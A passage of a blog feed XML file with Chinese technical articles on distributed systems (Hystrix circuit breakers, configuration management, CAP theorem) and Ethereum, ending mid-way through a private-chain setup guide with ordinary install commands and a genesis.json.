数据库等。在这些产品的基础上进行包装，使其符合session的存储和访问要求。</p><p>如果业务场景对session管理有比较高的要求，比如利用session服务基层单点登录（sso),用户服务器等功能，需要开发专门的session服务管理平台。</p><p>以上部分内容摘自《<strong>大型网站技术架构：核心原理与案例分析</strong>》一书，获取该书高清电子版，及更多架构技术书籍，可在公众号菜单中回复”<strong>微信群</strong>“，在对应的群文件中进行获取。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式服务防雪崩熔断器，Hystrix 理论实战</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E9%98%B2%E9%9B%AA%E5%B4%A9%E7%86%94%E6%96%AD%E5%99%A8%EF%BC%8CHystrix%20%E7%90%86%E8%AE%BA%E5%AE%9E%E6%88%98%E3%80%82/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E6%9C%8D%E5%8A%A1%E9%98%B2%E9%9B%AA%E5%B4%A9%E7%86%94%E6%96%AD%E5%99%A8%EF%BC%8CHystrix%20%E7%90%86%E8%AE%BA%E5%AE%9E%E6%88%98%E3%80%82/</url>
      
        <content type="html"><![CDATA[<p><img src="http://images2017.cnblogs.com/blog/719930/201709/719930-20170903171704624-1917697781.png" alt="image"></p><h4 id="Hystrix是什么？"><a href="#Hystrix是什么？" class="headerlink" title="Hystrix是什么？"></a>Hystrix是什么？</h4><p>hystrix对应的中文名字是“豪猪”，豪猪周身长满了刺，能保护自己不受天敌的伤害，代表了一种防御机制，这与hystrix本身的功能不谋而合，因此Netflix团队将该框架命名为Hystrix，并使用了对应的卡通形象做作为logo。</p><p>在一个分布式系统里，许多依赖不可避免的会调用失败，比如超时、异常等，如何能够保证在一个依赖出问题的情况下，不会导致整体服务失败，这个就是Hystrix需要做的事情。Hystrix提供了熔断、隔离、Fallback、cache、监控等功能，能够在一个、或多个依赖同时出现问题时保证系统依然可用。</p><h4 id="为什么需要Hystrix"><a href="#为什么需要Hystrix" class="headerlink" title="为什么需要Hystrix?"></a>为什么需要Hystrix?</h4><p>在大中型分布式系统中，通常系统很多依赖(HTTP,hession,Netty,Dubbo等)，如下图:</p><p> <img src="http://dl2.iteye.com/upload/attachment/0103/1037/887e7862-578a-3616-a15c-1ef1cb62f3c4.png" alt="image"></p><p>在高并发访问下,这些依赖的稳定性与否对系统的影响非常大,但是依赖有很多不可控问题:如网络连接缓慢，资源繁忙，暂时不可用，服务脱机等。</p><p>如下图：QPS为50的依赖 I 出现不可用，但是其他依赖仍然可用。</p><p><img src="http://dl2.iteye.com/upload/attachment/0103/1039/3bd6d0be-9ce5-35c2-bbd9-3493671b45d5.png" alt="image"></p><p>当依赖I 阻塞时,大多数服务器的线程池就出现阻塞(BLOCK),影响整个线上服务的稳定性.如下图:</p><p><img src="http://dl2.iteye.com/upload/attachment/0103/1041/22f20da1-4096-314c-8c9f-5728251c46af.png" alt="image"></p><p>在复杂的分布式架构的应用程序有很多的依赖，都会不可避免地在某些时候失败。高并发的依赖失败时如果没有隔离措施，当前应用服务就有被拖垮的风险。</p><pre class="line-numbers language-none"><code class="language-none">例如:一个依赖30个SOA服务的系统,每个服务99.99%可用。  99.99%的30次方 ≈ 99.7%  0.3% 意味着一亿次请求 会有 3,000,00次失败  换算成时间大约每月有2个小时服务不稳定.  随着服务依赖数量的变多，服务不稳定的概率会成指数性提高.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解决问题方案:对依赖做隔离,Hystrix就是处理依赖隔离的框架,同时也是可以帮我们做依赖服务的治理和监控。</p><p>Netflix 公司开发并成功使用Hystrix,使用规模如下:</p><pre class="line-numbers language-none"><code class="language-none">The Netflix API processes 10+ billion HystrixCommand executions per day using thread isolation.   Each API instance has 40+ thread-pools with 5-20 threads in each (most are set to 10).<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Hystrix如何解决依赖隔离？"><a href="#Hystrix如何解决依赖隔离？" class="headerlink" title="Hystrix如何解决依赖隔离？"></a>Hystrix如何解决依赖隔离？</h4><ol><li><p>Hystrix使用命令模式HystrixCommand(Command)包装依赖调用逻辑，每个命令在单独线程中&#x2F;信号授权下执行。</p></li><li><p>可配置依赖调用超时时间,超时时间一般设为比99.5%平均时间略高即可.当调用超时时，直接返回或执行fallback逻辑。</p></li><li><p>为每个依赖提供一个小的线程池（或信号），如果线程池已满调用将被立即拒绝，默认不采用排队.加速失败判定时间。</p></li><li><p>依赖调用结果分:成功，失败（抛出异常），超时，线程拒绝，短路。 请求失败(异常，拒绝，超时，短路)时执行fallback(降级)逻辑。</p></li><li><p>提供熔断器组件,可以自动运行或手动调用,停止当前依赖一段时间(10秒)，熔断器默认错误率阈值为50%,超过将自动运行。</p></li><li><p>提供近实时依赖的统计和监控。</p></li></ol><p>Hystrix依赖的隔离架构,如下图:</p><p><img src="http://dl2.iteye.com/upload/attachment/0103/1043/8db93de3-db14-355f-ac70-16d06481b020.png" alt="image"></p><h4 id="Hystrix应用实战"><a href="#Hystrix应用实战" class="headerlink" title="Hystrix应用实战"></a>Hystrix应用实战</h4><p><strong>Maven</strong>：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;    &lt;groupId&gt;com.netflix.hystrix&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;hystrix-core&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.5.13&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码太多，不一一贴上来，这里只展示主要的测试源码。</p><pre class="line-numbers language-none"><code class="language-none">public static void main(String[] args) &#123;    System.out.println(test(&quot;javastack&quot;));&#125;private static String test(String name) &#123;    HystrixUtil.HystrixReqConfig hc &#x3D; HystrixUtil.HystrixReqConfig.withGroupKey(&quot;TestGroup&quot;).withTimeout(3)            .withUnit(TimeUnit.SECONDS).withPassNum(64);    String result &#x3D; HystrixUtil.getExcuteResult(new HystrixCallableService&lt;String&gt;() &#123;        @Override        public String execute() &#123;            try &#123;                Thread.sleep(5000);            &#125; catch (InterruptedException e) &#123;                e.printStackTrace();            &#125;            return &quot;success &quot; + name;        &#125;        @Override        public String fallback() &#123;            return &quot;fallback &quot; + name;        &#125;    &#125;, hc);    return result;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里设置了3秒超时进入熔断。</p><p>测试程序中休眠5秒，进入熔断器并输出：</p><pre class="line-numbers language-none"><code class="language-none">fallback javastack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试程序中休眠2秒，进入正常流程并输出：</p><pre class="line-numbers language-none"><code class="language-none">success javastack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>熔断器测试成功，即使某个服务出问题，也不会影响整个系统的正常运行。</p><p>获取全部打包源码可以在公众号菜单中回复”微信群”加入微信群，并在对应的群文件中下载。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式系统中处理参数配置的 4 种方案</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%A4%84%E7%90%86%E5%8F%82%E6%95%B0%E9%85%8D%E7%BD%AE%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E6%A1%88/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%A4%84%E7%90%86%E5%8F%82%E6%95%B0%E9%85%8D%E7%BD%AE%E7%9A%84%204%20%E7%A7%8D%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<p>一个系统中包含有各种各样的配置信息，如一个日志文件需要配置以下几个信息。</p><ul><li>日志文件生成主目录</li><li>日志文件名称，不同的日志级别对应不同的文件</li><li>当前日志级别</li></ul><p>还有其他各种业务参数、系统参数等，大多单一系统是直接把这些配置写死在配置文件中，当部署到测试、生产环境就再修改下配置文件，这样很容易出错，也不能灵活修改。还有就是系统变成分布式系统后，子系统越来越多，你要维护这些配置就变得越来越困难。</p><p><strong>我觉得至少要能解决以下几个问题才能算优秀！</strong></p><p>1）能在线灵活修改配置</p><p>2）能在线动态刷新配置</p><p>3）能根据不同环境配置</p><p>4）能统一管理维护配置</p><p>那么如何灵活维护这些配置呢？我给大家总结了一下几类方法，根据不同的应用场大家参考一下。</p><h4 id="1、数据库法"><a href="#1、数据库法" class="headerlink" title="1、数据库法"></a>1、数据库法</h4><p>把所有参数存储到数据库，系统启动的时候加载到内存。</p><p>这种实现方式比较简单，但需要占用数据库资源，系统简单压力较小时可以选用此种方式。</p><h4 id="2、打包处理法"><a href="#2、打包处理法" class="headerlink" title="2、打包处理法"></a>2、打包处理法</h4><p>利用 Maven 的 <code>maven-resources-plugin</code> 插件，然后根据不同的环境（Profile）提供不同环境的配置文件，这样，不同环境的配置信息在打包阶段就决定好了。</p><p>这样只能解决了不同操作系统上面的配置，不能灵活动态修改，每次更新只能重新打包或者在线修改配置文件，而且信息也难于同步，如果项目少还好，项目多起来，配置还要经常变动，这样变得异常烦琐。</p><h4 id="3、环境变量法"><a href="#3、环境变量法" class="headerlink" title="3、环境变量法"></a>3、环境变量法</h4><p>可以把属性值设置到环境变量中，然后读取后设置到 Java 系统属性中。这种可以实现区分不同环境的目的，但仍然不能动态更新配置，而且配置和维护环境变量相当麻烦，并且在分布式系统中更是个十分头疼的问题。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; 读取环境变量java.lang.System#getenv(java.lang.String)&#x2F;&#x2F; 设置系统属性java.lang.System#setProperty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种方法，一些全局的系统配置，如日志、缓存、临时目录等可以参考，主流日志系统都支持从 system properties 中读取配置。其他一些配置，不建议存储在环境变量中。</p><h4 id="4、配置中心法"><a href="#4、配置中心法" class="headerlink" title="4、配置中心法"></a>4、配置中心法</h4><p>1）目前大多数分布式配置中心都是基于 Zookeeper 来实现的，Spring Cloud 有自己的配置中心组件，它们都支持在线动态更新和刷新配置。</p><p>2）直接把配置存放在数据库，如果系统并发小的或者管理类系统的话可以参考，对于高并发应用不建议用数据库做配置中心，毕竟它会带来访问压力，而且实现动态更新配置也比较复杂。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>这是我们目前应用的 4 种配置方法，很显然，配置中心是最佳的解决方案，也解决了以上的几个问题，但需要依赖中间件及其高可用性，如果你有其他更好的方式，欢迎留言。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>到底什么是分布式系统？</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%B0%E5%BA%95%E4%BB%80%E4%B9%88%E6%98%AF%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="分布式系统背景"><a href="#分布式系统背景" class="headerlink" title="分布式系统背景"></a>分布式系统背景</h4><p>说分布式系统必须要说集中式系统，集中式系统中整个项目就是一个独立的应用，整个应用也就是整个项目，所有的东西都在一个应用里面。</p><p>如下图所示</p><p><img src="http://img.javastack.cn/18-1-17/45450981.jpg"></p><p>如一个网站就是一个应用，最后是多个增加多台服务器或者多个容器来达到负载均衡的避免单点故障的目的，当然，数据库是可以分开部署的。</p><p>集中式很明显的优点就是开发测试运维会比较方便，不用为考虑复杂的分布式环境。</p><p>集中式很明显的弊端就是不易扩展，每次更新都必须更新所有的应用。而且，一个有问题意味着所有的应用都有问题。当系统越来越大，集中式将是系统最大的瓶颈。</p><h4 id="什么是分布式系统？"><a href="#什么是分布式系统？" class="headerlink" title="什么是分布式系统？"></a>什么是分布式系统？</h4><blockquote><p>分布式系统是若干独立计算机的集合，这计算机对用户来说就像单个相关系统。</p></blockquote><p>以上定义摘自&lt;&lt;分布式系统原理与范型&gt;&gt;一书。</p><p>也就是说分布式系统背后是由一系列的计算机组成的，但用户感知不到背后的逻辑，就像访问单个计算机一样。</p><p>说的有点绕，我们可以来简单看下分布式系统图。</p><p><img src="http://img.javastack.cn/18-1-17/63126910.jpg"></p><h5 id="分布式系统利弊"><a href="#分布式系统利弊" class="headerlink" title="分布式系统利弊"></a>分布式系统利弊</h5><p>在分布式系统中：</p><p>1、应用可以按业务类型拆分成多个应用，再按结构分成接口层、服务层；我们也可以按访问入口分，如移动端、PC端等定义不同的接口应用；</p><p>2、数据库可以按业务类型拆分成多个实例，还可以对单表进行分库分表；</p><p>3、增加分布式缓存、搜索、文件、消息队列、非关系型数据库等中间件；</p><p>很明显，分布式系统可以解决集中式不便扩展的弊端，我们可以很方便的在任何一个环节扩展应用，就算一个应用出现问题也不会影响到别的应用。</p><p>随着微服务Spring Cloud &amp; Docker的大热，及国内开源分布式Dubbo框架的重生，分布式技术发展非常迅速。</p><p>分布式系统虽好，也带来了系统的复杂性，如分布式事务、分布式锁、分布式session、数据一致性等都是现在分布式系统中需要解决的难题，虽然已经有很多成熟的方案，但都不完美。分布式系统也增加了开发测试运维成本，工作量增加，分布式系统管理不好反而会变成一种负担。</p><p>如果你对分布式技术有更好的见解，或者对本文有异议，欢迎在下方留言。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式系统架构常识：CAP理论</title>
      <link href="/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%B8%B8%E8%AF%86%EF%BC%9ACAP%E7%90%86%E8%AE%BA%E3%80%82/"/>
      <url>/2025/10/29/%E5%88%86%E5%B8%83%E5%BC%8F%E6%8A%80%E6%9C%AF/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%B8%B8%E8%AF%86%EF%BC%9ACAP%E7%90%86%E8%AE%BA%E3%80%82/</url>
      
        <content type="html"><![CDATA[<h4 id="什么是CAP理论？"><a href="#什么是CAP理论？" class="headerlink" title="什么是CAP理论？"></a>什么是CAP理论？</h4><p>2000年7月，加州大学伯克利分校的Eric Brewer教授在ACM PODC会议上提出CAP猜想。2年后麻省理工学院的Seth Gilbert和NancyLynch从理论上证明了CAP，之后CAP理论正式成为分布式计算领域的公认定理。</p><p>CAP理论是由下面三个概念组成的，且在分布式系统中三者不能兼得，只能同时满足两种条件。</p><p><strong>一致性（C）</strong></p><blockquote><p>All nodes see the same data at the same time</p></blockquote><p>所有数据库集群节点在同一时间点看到的数据完全一致，即所有节点能实时保持数据同步。</p><p><strong>可用性（A）</strong></p><blockquote><p>Reads and writes always succeed</p></blockquote><p>读写操作永远是成功的。即服务一直是可用的，即使集群一部分节点故障，集群整体还能正常响应客户端的读写请求。</p><p><strong>分区容错性（P）</strong></p><blockquote><p>The system continues to operate despite arbitrary message loss or failure of part of the system</p></blockquote><p>尽管系统中有任意的信息丢失或故障，系统仍在继续运行。以实际效果而言，分区相当于对通信的时限要求。系统如果不能在时限内达成数据一致性，就意味着发生了分区的情况，必须就当前操作在C和A之间做出选择。</p><h4 id="CAP权衡使用"><a href="#CAP权衡使用" class="headerlink" title="CAP权衡使用"></a>CAP权衡使用</h4><p><strong>1、保留CA，放弃P</strong></p><p>如果想避免分区容错性问题的发生，一种做法是将所有的数据（与事务相关的）都放在一台机器上。虽然无法100%保证系统不会出错，但不会碰到由分区带来的负面效果。当然这个选择会严重的影响系统的扩展性。</p><p>作为一个分布式系统，放弃P，即相当于放弃了分布式，一旦并发性很高，单机服务根本不能承受压力。</p><p>像很多银行服务，确确实实就是舍弃了P，只用单台小型机+ORACLE保证服务可用性。</p><p><strong>2、保留CP，放弃A</strong></p><p>相对于放弃“分区容错性“来说，其反面就是放弃可用性。一旦遇到分区容错故障，那么受到影响的服务需要等待一定的时间，因此在等待期间系统无法对外提供服务。</p><p>作为分布式系统，有分区服务发生问题很有可能，如果因为某些服务不能用，导致整个服务都不能用，这个根本不是好的分布式系统。</p><p><strong>3、保留AP，舍弃C</strong></p><p>这里所说的放弃一致性，并不是完全放弃数据一致性，而是放弃数据的强一致性。即放弃了同一时刻的数据一致性，而保留数据的最终一致性。</p><p>以网络购物为例，对只剩下一件库存的商品，如果同时接受到了两份订单，那么较晚的订单将被告知商品告罄。</p><p>通常情况下，很多分布式服务系统都是采用该方案，保证可用性性，分布式服务，因为某些分区服务发生问题，先容忍，最终通过一些折中的方法达到最终数据一致性。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分布式技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是以太坊？</title>
      <link href="/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A5%E5%A4%AA%E5%9D%8A%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BB%A5%E5%A4%AA%E5%9D%8A%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是以太坊"><a href="#什么是以太坊" class="headerlink" title="什么是以太坊"></a>什么是以太坊</h2><p>以太坊是一个去中心化的区块链平台，这个项目是在2014年8月由世界各地的爱好者们在预售的时候进行的。它是由瑞士非营利组织Ethereum基金会开发的，他们都是来自世界各地的杰出人才。</p><p>以太坊允许任何人构建和使用区块链技术来运行去中心化的应用程序。像比特币一样，没有人完全控制或拥有以太坊，因为它是一个由世界各地许多人建立的开源项目。与比特币不同，以太坊设计更具有适应性和灵活性，在以太坊平台上创建应用程序很容易，并且随着Homestead版本的发行，任何人都可以安全地使用这些应用程序。</p><p>以太坊还能运行智能合同：应用程序完全按照程序运行，而不存在任何停机、审查、欺诈或第三方干预。</p><p>这些应用程序运行在一个定制的区块链上，这是一个非常强大的共享全球公共设施，它可以用来转移价值，并证明财产的所有权。</p><h2 id="以太坊特点"><a href="#以太坊特点" class="headerlink" title="以太坊特点"></a>以太坊特点</h2><ul><li>单独为智能合约指定编程语言Solidity；</li><li>使用了内存需求较高的哈希函数：避免出现算力矿机；</li><li>uncle块激励机制：降低矿池的优势，减少区块产生间隔为 15 秒；</li><li>难度调整算法：一定的自动反馈机制；</li><li>gas 限制调整算法：限制代码执行指令数，避免循环攻击；</li><li>记录当前状态的哈希树的根哈希值到区块：某些情形下实现轻量级客户端；</li><li>为执行智能合约而设计的简化的虚拟机EVM。</li></ul><h2 id="以太坊现状"><a href="#以太坊现状" class="headerlink" title="以太坊现状"></a>以太坊现状</h2><p>以太坊从诞生到2017年5月，短短3年半时间，全球已有200多个以太坊应用诞生。</p><p>2017年6月12日，以太币价格突破400美元，创下历史新高，从2017年2月份的8美元到6月15日的400美元，以太币的价格已经增长了50倍。与此同时，比特币的价格却出现了松动，相比此前的最高点已经降低了10%，以太币大有“接棒”比特币继续大涨的势头。</p><h2 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h2><blockquote><p>官网：<a href="https://ethereum.org/">https://ethereum.org/</a></p></blockquote><blockquote><p>开发文档： <a href="http://www.ethdocs.org/en/latest/">http://www.ethdocs.org/en/latest/</a></p></blockquote><blockquote><p>源码： <a href="https://github.com/ethereum/">https://github.com/ethereum/</a></p></blockquote><blockquote><p>网络状态：<a href="https://ethstats.net/">https://ethstats.net/</a></p></blockquote><blockquote><p>wiki: <a href="https://github.com/ethereum/wiki/wiki">https://github.com/ethereum/wiki/wiki</a></p></blockquote><blockquote><p>以太坊爱好者中文网站：<a href="http://ethfans.org/">http://ethfans.org/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>什么是共识机制？</title>
      <link href="/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6%EF%BC%9F/"/>
      <url>/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%80%E4%B9%88%E6%98%AF%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="共识机制"><a href="#共识机制" class="headerlink" title="共识机制"></a>共识机制</h2><p>共识机制的作用是为了确认区块链上的交易的有效性。</p><h2 id="共识机制分类"><a href="#共识机制分类" class="headerlink" title="共识机制分类"></a>共识机制分类</h2><p>目前常见的共识机制有POW工作量证明、POS权益证明、DPOS股份授权证明、Ripple共识机制以及PooL验证池，这几类共识机制各有优劣，应用场景也各不相同，下表展示了从不同维度对这几类共识机制的分析比较。</p><p><img src="https://pic2.zhimg.com/50/v2-73a9ad7bcae8aab0992487d9a8356659_hd.png" alt="image"></p><h5 id="1、POW（Proof-of-work）"><a href="#1、POW（Proof-of-work）" class="headerlink" title="1、POW（Proof of work）"></a>1、POW（Proof of work）</h5><p>POW即工作量证明，就是众所周知的挖矿，它是一种竞争共识，通过工作量的证明来获得生成区块的权力。它的优点是完全的去中心化，各个节点完全平等，而且可以自由的进出；缺点则是POW会造成大量的挖矿资源浪费，达成共识的周期也比较长。</p><h5 id="2、POS（Proof-of-Stake）"><a href="#2、POS（Proof-of-Stake）" class="headerlink" title="2、POS（Proof of Stake）"></a>2、POS（Proof of Stake）</h5><p>POS即权益证明，是POW的一种升级共识机制，它主要解决了POW工作量计算浪费的问题。当前POS已有很多不同的变种，但基本还是根据每个节点所占有代币的数量和时间（即权益）来决定其挖矿的难度。它的优点是缩短了各个节点之间达成共识的时间，缺点则是同POW一样仍然需要挖矿，并且POS会使得“富者更富”。</p><h5 id="3、DPOS（Delegate-Proof-of-Stake）"><a href="#3、DPOS（Delegate-Proof-of-Stake）" class="headerlink" title="3、DPOS（Delegate Proof of Stake）"></a>3、DPOS（Delegate Proof of Stake）</h5><p>DPOS即股份授权证明机制，是POS的一个变种。它的原理是让每个持有代币的人进行投票，由此产生一定数量的“超级节点”，由这些节点来轮流产生区块。它的优点是不再需要通过挖矿来产生区块，从而可以大幅缩小交易确认的时间，能够达到秒级的共识验证，缺点则是DPOS还是得依赖于代币，不适用于一般的商业应用。</p><h5 id="4、Ripple-Consensus（瑞波共识机制）"><a href="#4、Ripple-Consensus（瑞波共识机制）" class="headerlink" title="4、Ripple Consensus（瑞波共识机制）"></a>4、Ripple Consensus（瑞波共识机制）</h5><p>Ripple Consensus是一种数据正确性优先的网络交易同步机制，它是基于特殊节点列表达成的共识。在这种共识机制下，必须首先确定若干个初始特殊节点，如果要新接入一个节点，必须获得51%的初始节点的确认，并且只能由被确认的节点产生区块。因此，它区别于前面几类共识机制的主要因素是有一定的“中心化”。Ripple Consensus的优点是能保证任何时候都不会产生硬分叉，并且交易能被实时的验证；而缺点则是新加入节点要取得与其他节点的共识所需时间较长。</p><h5 id="5、POOL验证池"><a href="#5、POOL验证池" class="headerlink" title="5、POOL验证池"></a>5、POOL验证池</h5><p>POOL验证池是基于传统分布式一致性算法加上数据验证的机制，也是目前行业链大范围在使用的共识机制。它的优点是无需建立代币，在成熟的分布式一致性算法（Pasox、Raft）的基础上，能够实现实时共识验证；缺点是性能会随着节点数的增加而变差，并且去中心化程度不够。除了常见的以上所述的几类共识机制，在区块链的实际应用过程中，还存在着五花八门的依据业务逻辑自定义的共识机制，如小蚁的“中性记账”、类似Ripple Consensus的Stellar共识机制、Factom等众多以“侧链”形式存在的共识机制等。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>因此，本文依据共识机制的特性及典型性将其划分为三大类：POW、非POW以及侧链。</p>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 区块链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>以太坊私有链搭建</title>
      <link href="/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E6%90%AD%E5%BB%BA/"/>
      <url>/2025/10/29/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>操作系统：CentOS 6.5</p><h4 id="安装依赖组件"><a href="#安装依赖组件" class="headerlink" title="安装依赖组件"></a>安装依赖组件</h4><blockquote><p>sudo yum install git gcc gcc-c++ ntp epel-release nodejs -y</p></blockquote><h4 id="安装golang"><a href="#安装golang" class="headerlink" title="安装golang"></a>安装golang</h4><p>下载并解压：</p><blockquote><p>wget <a href="https://studygolang.com/dl/golang/go1.13.4.linux-amd64.tar.gz">https://studygolang.com/dl/golang/go1.13.4.linux-amd64.tar.gz</a><br>tar zxvf go1.13.4.linux-amd64.tar.gz<br>mv go &#x2F;usr&#x2F;local&#x2F;</p></blockquote><p>配置环境变量：</p><blockquote><p>vi &#x2F;etc&#x2F;profile</p></blockquote><p>添加：</p><pre class="line-numbers language-none"><code class="language-none">GOROOT&#x3D;&#x2F;usr&#x2F;local&#x2F;goPATH&#x3D;$GOROOT&#x2F;bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>配置生效：</p><blockquote><p>source &#x2F;etc&#x2F;profile</p></blockquote><p>查看 golang 版本：</p><blockquote><p>go version</p></blockquote><h4 id="编译go-ethereum"><a href="#编译go-ethereum" class="headerlink" title="编译go-ethereum"></a>编译go-ethereum</h4><p>下载并编译以太坊：</p><blockquote><p>git clone <a href="https://github.com/ethereum/go-ethereum.git">https://github.com/ethereum/go-ethereum.git</a><br>cd go-ethereum<br>make all</p></blockquote><p>添加环境变量：</p><blockquote><p>vi &#x2F;etc&#x2F;profile</p></blockquote><pre class="line-numbers language-none"><code class="language-none">PATH&#x3D;$GOROOT&#x2F;bin:&#x2F;root&#x2F;ethereum&#x2F;go-ethereum&#x2F;build&#x2F;bin:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>配置生效：</p><blockquote><p>source &#x2F;etc&#x2F;profile</p></blockquote><h4 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h4><p>进入控制台：</p><blockquote><p>geth –datadir data –nodiscover console</p></blockquote><p>创建账户：</p><blockquote><p>personal.newAccount(“123456”)</p></blockquote><p>参数为私钥密码，返回账户的公钥。</p><p>查询账户列表：</p><blockquote><p>eth.accounts</p></blockquote><h4 id="搭建私有链"><a href="#搭建私有链" class="headerlink" title="搭建私有链"></a>搭建私有链</h4><blockquote><p>vim genesis.json</p></blockquote><p>创建创世区块，输入并保存以下内容：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;nonce&quot;: &quot;0x0000000000000042&quot;,  &quot;timestamp&quot;: &quot;0x00&quot;,  &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,  &quot;extraData&quot;: &quot;0x00&quot;,  &quot;gasLimit&quot;: &quot;0x80000000&quot;,  &quot;difficulty&quot;: &quot;0x400&quot;,  &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;,  &quot;coinbase&quot;: &quot;0x0000000000000000000000000000000000000000&quot;,  &quot;alloc&quot;: &#123;        &quot;0x4f4db5c14123474b1b173a8d25e676f388202010&quot;: &#123;          &quot;balance&quot;: &quot;1000&quot;      &#125;     &#125;,  &quot;config&quot;: &#123;    &quot;chainId&quot;: 15,    &quot;homesteadBlock&quot;: 0,    &quot;eip150Block&quot;: 0,    &quot;eip155Block&quot;: 0,    &quot;eip158Block&quot;: 0  &#125;&#125;<span aria-hidden="true" 